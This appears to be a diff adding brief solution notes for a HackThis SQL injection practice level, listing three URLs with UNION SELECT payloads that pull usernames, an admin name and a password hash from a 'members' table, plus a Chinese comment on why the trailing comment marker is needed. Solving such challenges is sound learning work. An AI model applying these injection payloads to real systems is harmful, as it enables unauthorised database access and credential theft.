@@ -1,0 +1,7 @@
+https://www.hackthis.co.uk/levels/sqli/2?browse&q=v%27+UNION+SELECT+admin+as+username,+admin+FROM+members--
+### 0 1
+https://www.hackthis.co.uk/levels/sqli/2?browse&q=v%27+UNION+SELECT+username,admin+FROM+members+WHERE+admin=1--
+### bellamond
+https://www.hackthis.co.uk/levels/sqli/2?browse&q=v%27+UNION+SELECT+password+username,admin+FROM+members+WHERE+admin=1--
+### 1b774bc166f3f8918e900fcef8752817bae76a37
+# -- 一定要加，用来注释掉后端加的%
